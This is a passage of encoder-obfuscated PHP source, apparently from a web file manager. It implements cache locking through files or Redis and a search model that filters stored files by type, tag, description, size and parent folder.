$¨÷ÍŠ°[$¦øÉ¹Æƒ[833]] == $¦øÉ¹Æƒ[2298] ? 1 : 0; $this->shareFileMeta($©Ô…äï[$¦øÉ¹Æƒ[553]], $Âû†¦òª); $this->removeByFile($©Ô…äï[$¦øÉ¹Æƒ[553]]); } return $­ó“¦…œ; } private function removeByFile($·åş—ã) { $èö­€“” =& $_SERVER[¿ÈˆÑ¸ä]; $õÌ•Á½Ÿ = Model($èö­€“”[916])->where(array($èö­€“”[553] => $·åş—ã))->field($èö­€“”[192])->select(); $Ñ¶»Ş·õ = array_to_keyvalue($õÌ•Á½Ÿ, $èö­€“”[12], $èö­€“”[192]); $ÕÓ÷€¦Ë = array($èö­€“”[192] => array($èö­€“”[7], $Ñ¶»Ş·õ), $èö­€“”[574] => 1); $õÌ•Á½Ÿ = $this->where($ÕÓ÷€¦Ë)->field($èö­€“”[684])->select(); if (empty($õÌ•Á½Ÿ)) { return; } $ÑõîÑÙÈ = array_to_keyvalue($õÌ•Á½Ÿ, $èö­€“”[12], $èö­€“”[684]); $this->remove($ÑõîÑÙÈ); } private function shareFileMeta($Å‰œ††é, $Š¶øŠÔ = null) { $©Â”êšº =& $_SERVER[¿ÈˆÑ¸ä]; $êø‚§ò” = array($©Â”êšº[553] => $Å‰œ††é, $©Â”êšº[95] => $©Â”êšº[2303]); if (is_null($Š¶øŠÔ)) { return Model($©Â”êšº[2304])->where($êø‚§ò”)->find(); } $êø‚§ò”[$©Â”êšº[451]] = $Š¶øŠÔ; Model($©Â”êšº[2304])->add($êø‚§ò”, array(), !0); } } goto c…°´ãŠÖĞ; Aó™åÃ“ˆ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $‰‹œØâ¶ =& $_SERVER[¿ÈˆÑ¸ä]; $ÍÔ±ü¦Ğ = $GLOBALS[$‰‹œØâ¶[6]][$‰‹œØâ¶[425]]; self::$cachePath = $ÍÔ±ü¦Ğ[$‰‹œØâ¶[231]][$‰‹œØâ¶[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($éî»¾ò», $´´–ÇìÆ = 0) { $¹ÒèµËô =& $_SERVER[¿ÈˆÑ¸ä]; $™äìß¯í = microtime(!0); $³ÕÏÏ‘‰ = $™äìß¯í + $´´–ÇìÆ + 0.0001; $„§‚¬ÏÜ = rtrim(self::$cachePath, $¹ÒèµËô[8]) . $¹ÒèµËô[959] . md5($éî»¾ò») . $¹ÒèµËô[956]; if (file_exists($„§‚¬ÏÜ) && filemtime($„§‚¬ÏÜ) && filemtime($„§‚¬ÏÜ) < time() - 10) { @unlink($„§‚¬ÏÜ); } do { if (file_exists($„§‚¬ÏÜ)) { cacheLockWait(); continue; } $ÜÎ“¯Ï± = fopen($„§‚¬ÏÜ, $¹ÒèµËô[960]); if (!$ÜÎ“¯Ï±) { return !1; } $´´å±Ã = flock($ÜÎ“¯Ï±, LOCK_EX | LOCK_NB); self::$caches[$éî»¾ò»] = array($¹ÒèµËô[961] => $ÜÎ“¯Ï±, $¹ÒèµËô[231] => $„§‚¬ÏÜ); fwrite($ÜÎ“¯Ï±, $³ÕÏÏ‘‰); clearstatcache(); if ($ÜÎ“¯Ï± && $´´å±Ã) { return !0; } cacheLockWait(); } while (microtime(!0) < $³ÕÏÏ‘‰); $this->unlock($éî»¾ò»); return !1; } public function lockGet($ç›µÙ‰€) { $Õ˜¬Ï´º =& $_SERVER[¿ÈˆÑ¸ä]; $‹´½¯“õ = rtrim(self::$cachePath, $Õ˜¬Ï´º[8]) . $Õ˜¬Ï´º[959] . md5($ç›µÙ‰€) . $Õ˜¬Ï´º[956]; return file_exists($‹´½¯“õ); } public function unlock($øèœûò÷) { $ù×«Ù© =& $_SERVER[¿ÈˆÑ¸ä]; $ õšØªò = self::$caches[$øèœûò÷]; if (!$ õšØªò) { return; } @flock($ õšØªò[$ù×«Ù©[961]], LOCK_UN); @fclose($ õšØªò[$ù×«Ù©[961]]); @unlink($ õšØªò[$ù×«Ù©[231]]); unset(self::$caches[$øèœûò÷]); } } class CacheLockRedis { public function lock($¬×ÜáúÕ, $Ó¶ØùŞ = 10) { $õ·÷›‘ = Cache::init(); $³²ÄÏ–È = microtime(!0) + $Ó¶ØùŞ; while (microtime(!0) < $³²ÄÏ–È) { $Ş µíÙ = $õ·÷›‘->get($¬×ÜáúÕ); if (!$Ş µíÙ) { $êŞÇùÂ­ = $õ·÷›‘->setLock($¬×ÜáúÕ, $³²ÄÏ–È, $Ó¶ØùŞ); if ($êŞÇùÂ­) { return !0; } } else { if ($Ş µíÙ < microtime(!0)) { $õ·÷›‘->set($¬×ÜáúÕ, $³²ÄÏ–È, $Ó¶ØùŞ * 2); if ($õ·÷›‘->get($¬×ÜáúÕ) === $Ş µíÙ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($âøìÅ·í) { return Cache::init()->get($âøìÅ·í); } public function unlock($õ˜ï»‡) { return Cache::init()->remove($õ˜ï»‡); } } goto FÌñé¼Š¯‰; fïøÑïï†£: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Âİøı÷Õ) { $¾çÔ†ÏÏ =& $_SERVER[¿ÈˆÑ¸ä]; $Ûâ§š¶Ô = KodIO::fileTypeList(); $·™œªœæ = $Ûâ§š¶Ô[$Âİøı÷Õ]; if (!$·™œªœæ) { return array(); } $…ö×—˜Ã = $·™œªœæ[$¾çÔ†ÏÏ[167]]; $Ü³Ü°šÙ = $¾çÔ†ÏÏ[7]; if (!$·™œªœæ[$¾çÔ†ÏÏ[167]]) { $ƒÏ©ºÖÏ = array_to_keyvalue($Ûâ§š¶Ô, $¾çÔ†ÏÏ[12], $¾çÔ†ÏÏ[167]); $…ö×—˜Ã = implode($¾çÔ†ÏÏ[50], $ƒÏ©ºÖÏ); $Ü³Ü°šÙ = $¾çÔ†ÏÏ[2386]; } $ßƒƒè = explode($¾çÔ†ÏÏ[50], trim($…ö×—˜Ã, $¾çÔ†ÏÏ[50])); return array($Ü³Ü°šÙ, $ßƒƒè); } public function listPathType($ï¦çÙø) { $Û€•ıµ¶ =& $_SERVER[¿ÈˆÑ¸ä]; $§¹İ§ª = $this->fileTypeWhere($ï¦çÙø); if (!$§¹İ§ª) { return array(); } $½âƒŸöÜ = USER_ID; $îÀ¡Ó¸Ó = Model($Û€•ıµ¶[613])->getInfo($½âƒŸöÜ); $Š«®ü°à = array($Û€•ıµ¶[667] => SourceModel::TYPE_USER, $Û€•ıµ¶[600] => array($Û€•ıµ¶[631], $Û€•ıµ¶[609] . $îÀ¡Ó¸Ó[$Û€•ıµ¶[90]][$Û€•ıµ¶[192]] . $Û€•ıµ¶[632]), $Û€•ıµ¶[668] => $½âƒŸöÜ, $Û€•ıµ¶[665] => 0, $Û€•ıµ¶[666] => $§¹İ§ª); return $this->listSource($Š«®ü°à); } public function listSearch($Ñ ·â¶â, $˜ßöĞ…Ã = 300) { $•ı¬²à  =& $_SERVER[¿ÈˆÑ¸ä]; if (isset($Ñ ·â¶â[$•ı¬²à [2218]]) && $Ñ ·â¶â[$•ı¬²à [2218]]) { $Ñ ·â¶â[$•ı¬²à [2218]] = str_replace($•ı¬²à [471], $•ı¬²à [2387], trim($Ñ ·â¶â[$•ı¬²à [2218]])); } $ª‘’ä–” = $this->_parseSearchWhere($Ñ ·â¶â); if (!isset($ª‘’ä–”[$•ı¬²à [516]])) { $ª‘’ä–”[$•ı¬²à [516]] = 0; } $Î†Œê…¦ = $•ı¬²à [2388]; $»ÁŞ»­ = $ª‘’ä–”; $‹İœ…ğâ = $Î†Œê…¦; $this->_listSearchBindPinyin($Ñ ·â¶â, $ª‘’ä–”, $Î†Œê…¦); $this->alias($•ı¬²à [529])->_makeOrder(); $ª‘’ä–” = $this->parseWhereLike($ª‘’ä–”); $œıçç×š = $this->distinct(!0)->field($Î†Œê…¦)->where($ª‘’ä–”)->selectPage($˜ßöĞ…Ã); if ($GLOBALS[$•ı¬²à [6]][$•ı¬²à [468]][$•ı¬²à [469]] && Input::check($Ñ ·â¶â[$•ı¬²à [2218]], $•ı¬²à [674]) && $œıçç×š[$•ı¬²à [443]][$•ı¬²à [429]] == 1 && $œıçç×š[$•ı¬²à [443]][$•ı¬²à [444]] == 0) { $œıçç×š = $this->distinct(!0)->field($Î†Œê…¦)->where($»ÁŞ»­)->limit(1000)->select(); $œıçç×š = array_page_split($œıçç×š, !1, $˜ßöĞ…Ã); } $this->_listSearchFileContent($œıçç×š, $Ñ ·â¶â, $‹İœ…ğâ, $»ÁŞ»­); $this->_listSearchDesc($œıçç×š, $Ñ ·â¶â, $‹İœ…ğâ); $this->_listSearchTag($œıçç×š, $Ñ ·â¶â, $‹İœ…ğâ); $this->_listSearchGroupTag($œıçç×š, $Ñ ·â¶â, $‹İœ…ğâ); $this->_listDataApply($œıçç×š[$•ı¬²à [446]]); $this->_listMake($œıçç×š); return $œıçç×š; } private function _listSearchFileContent(&$¿¾­­ö­, $Ñ½˜Ï…, $…¤ã§·, $×âÀÔ©») { $€©ÊŒÙ§ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Ñ½˜Ï…[$€©ÊŒÙ§[2218]] || $¿¾­­ö­[$€©ÊŒÙ§[443]][$€©ÊŒÙ§[429]] > 1) { return; } if (!isset($×âÀÔ©»[$€©ÊŒÙ§[32]]) || !is_array($Ñ½˜Ï…[$€©ÊŒÙ§[553]])) { return; } $×âÀÔ©»[$€©ÊŒÙ§[553]] = array($€©ÊŒÙ§[7], $Ñ½˜Ï…[$€©ÊŒÙ§[553]]); unset($×âÀÔ©»[$€©ÊŒÙ§[32]]); unset($Ñ½˜Ï…[$€©ÊŒÙ§[553]]); $Ù¿Í„ï = $this->field($…¤ã§·)->where($×âÀÔ©»)->limit($€©ÊŒÙ§[2389])->select(); if (!$Ù¿Í„ï || count($Ù¿Í„ï) == 0) { return; } $¿¾­­ö­[$€©ÊŒÙ§[446]] = array_merge($Ù¿Í„ï, $¿¾­­ö­[$€©ÊŒÙ§[446]]); $¿¾­­ö­[$€©ÊŒÙ§[443]][$€©ÊŒÙ§[444]] += count($Ù¿Í„ï); } private function _listSearchTag(&$˜ÙˆÊ†, $Óç®øÜÚ, $Ø¼ÕêÊ•) { $ê•ñ  =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($Óç®øÜÚ[$ê•ñ [2084]]) || !in_array($ê•ñ [2390], $Óç®øÜÚ[$ê•ñ [2084]])) { return; } if (!$Óç®øÜÚ[$ê•ñ [2218]] || $˜ÙˆÊ†[$ê•ñ [443]][$ê•ñ [429]] > 1) { return; } $òŞÀËïŸ = Model($ê•ñ [2391])->listData(); $‘ÙŠ¯¬Ú = array(); $»Š±ûŒ¦ = $Óç®øÜÚ[$ê•ñ [2218]]; foreach ($òŞÀËïŸ as $ß“âèšÈ) { $Š™„‡½ = $ß“âèšÈ[$ê•ñ [32]]; $»İ¢Ñã = str_replace($ê•ñ [53], $ê•ñ [12], Pinyin::get($Š™„‡½)); if (stripos($Š™„‡½, $»Š±ûŒ¦) !== !1 || stripos($»İ¢Ñã, $»Š±ûŒ¦) !== !1) { $‘ÙŠ¯¬Ú[] = $ß“âèšÈ[$ê•ñ [483]]; } } if (!$‘ÙŠ¯¬Ú) { return; } $ìÀ¼àÜ¿ = array($ê•ñ [511] => array($ê•ñ [7], $‘ÙŠ¯¬Ú), $ê•ñ [1529] => USER_ID); $ÔÍÉ»â = Model($ê•ñ [513])->field($ê•ñ [87])->where($ìÀ¼àÜ¿)->select(); $ÔÍÉ»â = array_to_keyvalue($ÔÍÉ»â, $ê•ñ [12], $ê•ñ [87]); $ùƒÇâº© = array_unique($ÔÍÉ»â); $this->_listSearchMerge($˜ÙˆÊ†, $Óç®øÜÚ, $Ø¼ÕêÊ•, $ùƒÇâº©); } private function _listSearchDesc(&$âÑªÛ„ó, $ËïÁ®ş™, $‰èºèÉŞ) { $¼¹ìËĞœ =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($ËïÁ®ş™[$¼¹ìËĞœ[2084]]) || !in_array($¼¹ìËĞœ[536], $ËïÁ®ş™[$¼¹ìËĞœ[2084]])) { return; } if (!$ËïÁ®ş™[$¼¹ìËĞœ[2218]] || $âÑªÛ„ó[$¼¹ìËĞœ[443]][$¼¹ìËĞœ[429]] > 1) { return; } $¼ü¼É¦ = array($¼¹ìËĞœ[95] => $¼¹ìËĞœ[536], $¼¹ìËĞœ[451] => array($¼¹ìËĞœ[470], $¼¹ìËĞœ[2220] . $ËïÁ®ş™[$¼¹ìËĞœ[2218]] . $¼¹ìËĞœ[2220])); $Üö£Ê· = !1; if ($Üö£Ê·) { $í¯¥ËàÉ = $this->listSearchChildren($ËïÁ®ş™[$¼¹ìËĞœ[191]]); $í¯¥ËàÉ = array_unique($í¯¥ËàÉ); if (!$í¯¥ËàÉ) { return; } $¼ü¼É¦[$¼¹ìËĞœ[192]] = array($¼¹ìËĞœ[7], $í¯¥ËàÉ); } $İ×±ÈË¾ = Model($¼¹ìËĞœ[651])->field($¼¹ìËĞœ[192])->where($¼ü¼É¦)->limit(5000)->select(); $Š™ı’ßğ = array_to_keyvalue($İ×±ÈË¾, $¼¹ìËĞœ[12], $¼¹ìËĞœ[192]); $this->_listSearchMerge($âÑªÛ„ó, $ËïÁ®ş™, $‰èºèÉŞ, $Š™ı’ßğ); } private function _listSearchGroupTag(&$û’¨Èà¨, $À®èşŒÖ, $ñÔö‚°è) { $²±ÑØî™ =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($À®èşŒÖ[$²±ÑØî™[2084]]) || !in_array($²±ÑØî™[2390], $À®èşŒÖ[$²±ÑØî™[2084]])) { return; } if (!$À®èşŒÖ[$²±ÑØî™[2218]] || $û’¨Èà¨[$²±ÑØî™[443]][$²±ÑØî™[429]] > 1 || !$À®èşŒÖ[$²±ÑØî™[191]]) { return; } $æ¶¾Ä÷• = $this->sourceInfo($À®èşŒÖ[$²±ÑØî™[191]]); if (!$æ¶¾Ä÷• || $æ¶¾Ä÷•[$²±ÑØî™[189]] != SourceModel::TYPE_GROUP) { return; } $„È«³şê = $æ¶¾Ä÷•[$²±ÑØî™[585]]; $Ó¥‰˜‡á = Model($²±ÑØî™[2392])->get($„È«³şê); $½»²±ÏĞ = array(); $ë›Çí¯ì = $À®èşŒÖ[$²±ÑØî™[2218]]; foreach ($Ó¥‰˜‡á[$²±ÑØî™[446]] as $—»¿´) { $êÔ¸óû© = $—»¿´[$²±ÑØî™[32]]; $®ì¯î±À = str_replace($²±ÑØî™[53], $²±ÑØî™[12], Pinyin::get($êÔ¸óû©)); if (stripos($êÔ¸óû©, $ë›Çí¯ì) !== !1 || stripos($®ì¯î±À, $ë›Çí¯ì) !== !1) { $½»²±ÏĞ[] = $—»¿´[$²±ÑØî™[483]]; } } if (!$½»²±ÏĞ) { return; } $şÅ–Ïõ· = array($²±ÑØî™[511] => array($²±ÑØî™[7], $½»²±ÏĞ), $²±ÑØî™[1529] => 0, $²±ÑØî™[33] => $²±ÑØî™[1427] . $„È«³şê); $êªÍ´Éı = Model($²±ÑØî™[513])->field($²±ÑØî™[87])->where($şÅ–Ïõ·)->select(); $êªÍ´Éı = array_to_keyvalue($êªÍ´Éı, $²±ÑØî™[12], $²±ÑØî™[87]); $¾™¸ê = array_unique($êªÍ´Éı); $this->_listSearchMerge($û’¨Èà¨, $À®èşŒÖ, $ñÔö‚°è, $¾™¸ê); } private function _listSearchMerge(&$‡Ö›‰å, $í ¬, $õËÀ­É, $ì¥Ê•Ê) { $ìŠ–à =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ì¥Ê•Ê) { return; } $¢ıãæÑ = array_to_keyvalue($‡Ö›‰å[$ìŠ–à[446]], $ìŠ–à[12], $ìŠ–à[192]); $·Ğğµû = array_diff($ì¥Ê•Ê, $¢ıãæÑ); if (!$·Ğğµû) { return; } $úò³‰ = array($ìŠ–à[192] => array($ìŠ–à[7], $·Ğğµû)); $±®óı¬˜ = $this->field($õËÀ­É)->where($úò³‰)->select(); if (!$±®óı¬˜) { return; } $¾Ş¾„… = array(); foreach ($±®óı¬˜ as $‹º¬Çáş) { if ($this->_listSearchFilter($‹º¬Çáş, $í ¬)) { $¾Ş¾„…[] = $‹º¬Çáş; } } $‡Ö›‰å[$ìŠ–à[446]] = array_merge($¾Ş¾„…, $‡Ö›‰å[$ìŠ–à[446]]); $‡Ö›‰å[$ìŠ–à[443]][$ìŠ–à[444]] += count($¾Ş¾„…); } private function _listSearchFilter($Õ¼¸“Şî, $’¿¿…) { $—Û„„²ø =& $_SERVER[¿ÈˆÑ¸ä]; $’×ÍË›ª = $Õ¼¸“Şî[$—Û„„²ø[496]] == $—Û„„²ø[91]; if (!strstr($Õ¼¸“Şî[$—Û„„²ø[600]], $—Û„„²ø[50] . $’¿¿…[$—Û„„²ø[191]] . $—Û„„²ø[50])) { return !1; } if (isset($’¿¿…[$—Û„„²ø[497]]) && $’¿¿…[$—Û„„²ø[497]] != $—Û„„²ø[862]) { if ($’¿¿…[$—Û„„²ø[497]] == $—Û„„²ø[78] && !$’×ÍË›ª) { return !1; } if ($’¿¿…[$—Û„„²ø[497]] != $—Û„„²ø[78] && $’×ÍË›ª) { return !1; } if (!strstr($Õ¼¸“Şî[$—Û„„²ø[167]], $—Û„„²ø[50] . $’¿¿…[$—Û„„²ø[497]] . $—Û„„²ø[50])) { return !1; } } if (isset($’¿¿…[$—Û„„²ø[2393]]) && $’¿¿…[$—Û„„²ø[2393]] < $Õ¼¸“Şî[$—Û„„²ø[79]]) { return !1; } if (isset($’¿¿…[$—Û„„²ø[2394]]) && $’¿¿…[$—Û„„²ø[2394]] > $Õ¼¸“Şî[$—Û„„²ø[79]]) { return !1; } if (isset($’¿¿…[$—Û„„²ø[681]]) && $’¿¿…[$—Û„„²ø[681]] != $Õ¼¸“Şî[$—Û„„²ø[539]]) { return !1; } return !0; } public function listSearchChildren($©ó–üïæ, $ì˜ƒé¶ = 5000) { $ÔäÕÂÅñ =& $_SERVER[¿ÈˆÑ¸ä]; $©¥ç“Õ = array(); $°å„´¹˜ = $this->sourceInfo($©ó–üïæ); $ºü¢° Œ = array($ÔäÕÂÅñ[600] => array($ÔäÕÂÅñ[470], $°å„´¹˜[$ÔäÕÂÅñ[600]] . $°å„´¹˜[$ÔäÕÂÅñ[192]] . $ÔäÕÂÅñ[632])); $Úš´ ™Â = $this->field($ÔäÕÂÅñ[79])->where($ºü¢° Œ)->limit($ì˜ƒé¶ + 1)->select(); $‹ÎÚ÷›Ğ = is_array($Úš´ ™Â) ? count($Úš´ ™Â) : 0; if ($‹ÎÚ÷›Ğ > $ì˜ƒé¶) { return $this->_listSearchChildrenNear($©ó–üïæ, $ì˜ƒé¶); } $± š»õ“ = $this->field($ÔäÕÂÅñ[192])->where($ºü¢° Œ)->select(); $©¥ç“Õ = array_to_keyvalue($± š»õ“, $ÔäÕÂÅñ[12], $ÔäÕÂÅñ[192]); return $©¥ç“Õ; } private function _listSearchChildrenNear($íÖã®ş×, $Ü‚Ó¶´³) { $¯šˆ‘èé =& $_SERVER[¿ÈˆÑ¸ä]; $Ó—‚Ò‘ = array(); $‹îÚÚ‘è = array($¯šˆ‘èé[191] => $íÖã®ş×); $ªÛÜœÎÌ = $this->field($¯šˆ‘èé[2395])->where($‹îÚÚ‘è)->select(); $ÁŞâ¡Úá = array_to_keyvalue(array_filter_by_field($ªÛÜœÎÌ, $¯šˆ‘èé[496], $¯šˆ‘èé[91]), $¯šˆ‘èé[12], $¯šˆ‘èé[192]); $Ó—‚Ò‘ = array_merge($Ó—‚Ò‘, array_to_keyvalue($ªÛÜœÎÌ, $¯šˆ‘èé[12], $¯šˆ‘èé[192])); if (!$ÁŞâ¡Úá) { return $Ó—‚Ò‘; } $‹îÚÚ‘è = array($¯šˆ‘èé[191] => array($¯šˆ‘èé[7], $ÁŞâ¡Úá)); $ªÛÜœÎÌ = $this->field($¯šˆ‘èé[2395])->where($‹îÚÚ‘è)->limit($Ü‚Ó¶´³)->select(); $Ó—‚Ò‘ = array_merge($Ó—‚Ò‘, array_to_keyvalue($ªÛÜœÎÌ, $¯šˆ‘èé[12], $¯šˆ‘èé[192])); $Ó—‚Ò‘ = array_slice($Ó—‚Ò‘, 0, intval($Ü‚Ó¶´³)); return $Ó—‚Ò‘; } private function _listSearchBindPinyin($ë²ãÛÊ«, &$¯­½Ã©, &$¿Ö¦¼»á) { $®øÃÂŸñ =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($ë²ãÛÊ«[$®øÃÂŸñ[2218]]) || !$ë²ãÛÊ«[$®øÃÂŸñ[2218]]) { return; } if (!Input::check($ë²ãÛÊ«[$®øÃÂŸñ[2218]], $®øÃÂŸñ[394]) || strlen($ë²ãÛÊ«[$®øÃÂŸñ[2218]]) < 2) { return; } $¬€¥Ï‚Ò = "\114\105\x46\124\40\112\x4f\x49\116\40{$this->tablePrefix}\151\157\x5f\163\x6f\x75\162\x63\145\137\x6d\x65\164\141\40\x6d\145\164\x61\40\x6f\x6e\40\x73\x6f\165\x72\x63\145\x2e\x73\x6f\165\162\x63\145\111\x44\x20\x3d\40\x6d\145\x74\x61\x2e\163\x6f\165\162\143\145\x49\x44"; $‘÷ø¨²¢ = array(); $¿Ö¦¼»á = str_replace(array($®øÃÂŸñ[286], $®øÃÂŸñ[53], $®øÃÂŸñ[2396]), $®øÃÂŸñ[12], $¿Ö¦¼»á); $¿Ö¦¼»á = $®øÃÂŸñ[521] . str_replace($®øÃÂŸñ[50], $®øÃÂŸñ[522], $¿Ö¦¼»á); $ªÍ’ï•æ = $¯­½Ã©[$®øÃÂŸñ[32]]; unset($¯­½Ã©[$®øÃÂŸñ[32]]); foreach ($¯­½Ã© as $Ÿ²ºêÀô => $Õˆ») { $‘÷ø¨²¢[$®øÃÂŸñ[521] . $Ÿ²ºêÀô] = $Õˆ»; } foreach ($ªÍ’ï•æ as $©¤Ğ™„ò) { $‘÷ø¨²¢[] = array($®øÃÂŸñ[526] => $©¤Ğ™„ò, $®øÃÂŸñ[1103] => $®øÃÂŸñ[2222], array($®øÃÂŸñ[2397] => $©¤Ğ™„ò, $®øÃÂŸñ[2398] => array($®øÃÂŸñ[7], array($®øÃÂŸñ[548], $®øÃÂŸñ[547])))); } $this->join($¬€¥Ï‚Ò); $¯­½Ã© = $‘÷ø¨²¢; } private function _parseSearchWhere($Ş˜ŸÔöÌ) { $½şÈ–Ùò =& $_SERVER[¿ÈˆÑ¸ä]; $Œ†¿Õ÷ì = array(); if (isset($Ş˜ŸÔöÌ[$½şÈ–Ùò[844]]) && $Ş˜ŸÔöÌ[$½şÈ–Ùò[844]]) { $Œ†¿Õ÷ì[$½şÈ–Ùò[88]] = array($½şÈ–Ùò[2399], $Ş˜ŸÔöÌ[$½şÈ–Ùò[844]]); } if (isset($Ş˜ŸÔöÌ[$½şÈ–Ùò[845]]) && $Ş˜ŸÔöÌ[$½şÈ–Ùò[845]]) { $Ù°š®¶Ò = array($½şÈ–Ùò[2400], $Ş˜ŸÔöÌ[$½şÈ–Ùò[845]]); if ($Œ†¿Õ÷ì[$½şÈ–Ùò[88]]) { $Œ†¿Õ÷ì[$½şÈ–Ùò[88]] = array($Œ†¿Õ÷ì[$½şÈ–Ùò[88]], $Ù°š®¶Ò, $½şÈ–Ùò[2401]); } else { $Œ†¿Õ÷ì[$½şÈ–Ùò[88]] = $Ù°š®¶Ò; } } if (isset($Ş˜ŸÔöÌ[$½şÈ–Ùò[2393]]) && $Ş˜ŸÔöÌ[$½şÈ–Ùò[2393]] > 0) { $Œ†¿Õ÷ì[$½şÈ–Ùò[79]] = array($½şÈ–Ùò[2399], $Ş˜ŸÔöÌ[$½şÈ–Ùò[2393]]); } if (isset($Ş˜ŸÔöÌ[$½şÈ–Ùò[2394]]) && $Ş˜ŸÔöÌ[$½şÈ–Ùò[2394]]) { $Ù°š®¶Ò = array($½şÈ–Ùò[2400], $Ş˜ŸÔöÌ[$½şÈ–Ùò[2394]]); if ($Œ†¿Õ÷ì[$½şÈ–Ùò[79]]) { $Œ†¿Õ÷ì[$½şÈ–Ùò[79]] = array($Œ†¿Õ÷ì[$½şÈ–Ùò[79]], $Ù°š®¶Ò, $½şÈ–Ùò[2401]); } else { $Œ†¿Õ÷ì[$½şÈ–Ùò[79]] = $Ù°š®¶Ò; } } if (isset($Ş˜ŸÔöÌ[$½şÈ–Ùò[681]]) && $Ş˜ŸÔöÌ[$½şÈ–Ùò[681]]) { $Œ†¿Õ÷ì[] = array($½şÈ–Ùò[539] => $Ş˜ŸÔöÌ[$½şÈ–Ùò[681]], $½şÈ–Ùò[537] => $Ş˜ŸÔöÌ[$½şÈ–Ùò[681]], $½şÈ–Ùò[1103] => $½şÈ–Ùò[2222]); } if (isset($Ş˜ŸÔöÌ[$½şÈ–Ùò[497]]) && $Ş˜ŸÔöÌ[$½şÈ–Ùò[497]]) { $¯Í–ÅĞ« = $Ş˜ŸÔöÌ[$½şÈ–Ùò[497]]; if ($¯Í–ÅĞ« == $½şÈ–Ùò[78]) { $Œ†¿Õ÷ì[$½şÈ–Ùò[496]] = 1; } else { if ($¯Í–ÅĞ« == $½şÈ–Ùò[2402]) { $Œ†¿Õ÷ì[$½şÈ–Ùò[496]] = 0; } else { if ($¯Í–ÅĞ«) { $¯Í–ÅĞ« = is_array($¯Í–ÅĞ«) ? $¯Í–ÅĞ« : explode($½şÈ–Ùò[50], $¯Í–ÅĞ«); $Œ†¿Õ÷ì[$½şÈ–Ùò[497]] = array($½şÈ–Ùò[503], $¯Í–ÅĞ«); $Œ†¿Õ÷ì[$½şÈ–Ùò[496]] = 0; } } } } $this->_parseSearchParent($Ş˜ŸÔöÌ, $Œ†¿Õ÷ì); if (isset($Ş˜ŸÔöÌ[$½şÈ–Ùò[2218]]) && trim($Ş˜ŸÔöÌ[$½şÈ–Ùò[2218]])) { $œÙ¯†¸¼ = trim($Ş˜ŸÔöÌ[$½şÈ–Ùò[2218]]); $×©ÍóÎ = explode($½şÈ–Ùò[53], $œÙ¯†¸¼); if (strlen($œÙ¯†¸¼) > 2 && (substr($œÙ¯†¸¼, 0, 1) == $½şÈ–Ùò[119] && substr($œÙ¯†¸¼, -1) == $½şÈ–Ùò[119]) || substr($œÙ¯†¸¼, 0, 1) == $½şÈ–Ùò[58] && substr($œÙ¯†¸¼, -1) == $½şÈ–Ùò[58]) { $œÙ¯†¸¼ = substr($œÙ¯†¸¼, 1, -1); $×©ÍóÎ = array($œÙ¯†¸¼); } $Œ†¿Õ÷ì[$½şÈ–Ùò[32]] = array(array($½şÈ–Ùò[631], $½şÈ–Ùò[2220] . $œÙ¯†¸¼ . $½şÈ–Ùò[2220])); if (count($×©ÍóÎ) > 1) { $Œ†¿Õ÷ì[$½şÈ–Ùò[32]] = array(); foreach ($×©ÍóÎ as $¨ŞÑŸÒ¨) { if (!trim($¨ŞÑŸÒ¨)) { continue; } $Œ†¿Õ÷ì[$½şÈ–Ùò[32]][] = array($½şÈ–Ùò[631], $½şÈ–Ùò[2220] . trim($¨ŞÑŸÒ¨) . $½şÈ–Ùò[2220]); } } } return $Œ†¿Õ÷ì; } private function _parseSearchParent($¸×†°ßç, &$õıÄ³³±) { $‚ù…ö¤ü =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($¸×†°ßç[$‚ù…ö¤ü[191]]) || !$¸×†°ßç[$‚ù…ö¤ü[191]]) { return; } $¸×§œ”Ó = $this->pathInfo($¸×†°ßç[$‚ù…ö¤ü[191]]); $ì¹•õü¬ = $¸×§œ”Ó[$‚ù…ö¤ü[191]] . $‚ù…ö¤ü[12] === $‚ù…ö¤ü[229]; $ £«şÔ = $¸×§œ”Ó[$‚ù…ö¤ü[189]] == $‚ù…ö¤ü[594]; if ($¸×§œ”Ó[$‚ù…ö¤ü[610]] == $‚ù…ö¤ü[611]) { $´ §Êœ˜ = $this->sourceInfo($¸×†°ßç[$‚ù…ö¤ü[191]]); $¸×§œ”Ó[$‚ù…ö¤ü[600]] = $´ §Êœ˜[$‚ù…ö¤ü[600]]; } $õıÄ³³±[$‚ù…ö¤ü[671]] = array($‚ù…ö¤ü[631], $¸×§œ”Ó[$‚ù…ö¤ü[600]] . $¸×†°ßç[$‚ù…ö¤ü[191]] . $‚ù…ö¤ü[632]); $ç‹ìÏÔñ = isset($¸×†°ßç[$‚ù…ö¤ü[2084]]) && in_array($‚ù…ö¤ü[594], $¸×†°ßç[$‚ù…ö¤ü[2084]]); if (!$ç‹ìÏÔñ || !$ £«şÔ || !$ì¹•õü¬ || !$¸×§œ”Ó[$‚ù…ö¤ü[498]]) { return; } if (!AuthModel::authCheckRoot($¸×§œ”Ó[$‚ù…ö¤ü[498]][$‚ù…ö¤ü[499]])) { return; } $’øŠ—Ûƒ = $¸×§œ”Ó[$‚ù…ö¤ü[585]] . $‚ù…ö¤ü[12]; if ($’øŠ—Ûƒ == $‚ù…ö¤ü[91]) { unset($õıÄ³³±[$‚ù…ö¤ü[671]]); $õıÄ³³±[$‚ù…ö¤ü[189]] = self::TYPE_GROUP; return; } $ÜÂÔ†äí = Model($‚ù…ö¤ü[601])->groupChildrenAll($’øŠ—Ûƒ); $ØèÁ¬ËÙ = count($ÜÂÔ†äí); if ($ØèÁ¬ËÙ <= 1) { return; } $•¹ŠÊƒ› = array($‚ù…ö¤ü[191] => 0, $‚ù…ö¤ü[189] => self::TYPE_GROUP, $‚ù…ö¤ü[585] => array($‚ù…ö¤ü[7], $ÜÂÔ†äí)); $ÍêöÃ² = $this->field($‚ù…ö¤ü[2403])->where($•¹ŠÊƒ›)->limit($ØèÁ¬ËÙ)->select(); 